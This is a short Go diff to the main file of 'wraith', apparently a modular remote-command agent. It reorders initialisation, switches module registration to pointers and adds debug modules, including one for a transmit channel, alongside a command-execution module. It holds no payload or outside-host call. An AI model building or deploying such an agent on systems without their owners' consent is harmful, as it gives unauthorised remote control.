@@ -9,6 +9,7 @@ import (
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod/mod_lang"
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod/mod_part"
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod/mod_rx"
+	"git.0x1a8510f2.space/0x1a8510f2/wraith/stdmod/mod_tx"
 )
 
 const RESPECT_EXIT_SIGNALS = true
@@ -44,13 +45,20 @@ func main() {
 			Fingerprint: "a",
 		},
 	}
-	w.Init()
+
+	// Set up debugging modules if needed
+	w.Modules.Register("w.debug", libwraith.ModCommsChanRx, &mod_rx.DebugModule{}, true)
+	w.Modules.Register("w.debug", libwraith.ModProtoLang, &mod_lang.DebugModule{}, true)
+	w.Modules.Register("w.debug", libwraith.ModProtoPart, &mod_part.DebugModule{}, true)
+	w.Modules.Register("w.debug", libwraith.ModCommsChanTx, &mod_tx.DebugModule{}, true)
 
 	// Set up modules
-	w.Modules.Register("w.jwt", libwraith.ModProtoLang, mod_lang.JWTModule{}, true)
-	w.Modules.Register("w.cmd", libwraith.ModProtoPart, mod_part.CmdModule{}, true)
-	w.Modules.Register("w.validity", libwraith.ModProtoPart, mod_part.ValidityModule{}, true)
-	w.Modules.Register("w.debug", libwraith.ModCommsChanRx, mod_rx.DebugModule{}, true)
+	w.Modules.Register("w.jwt", libwraith.ModProtoLang, &mod_lang.JWTModule{}, true)
+	w.Modules.Register("w.cmd", libwraith.ModProtoPart, &mod_part.CmdModule{}, true)
+	w.Modules.Register("w.validity", libwraith.ModProtoPart, &mod_part.ValidityModule{}, true)
+
+	// Init Wraith
+	w.Init()
 
 	// Run Wraith
 	go w.Run()
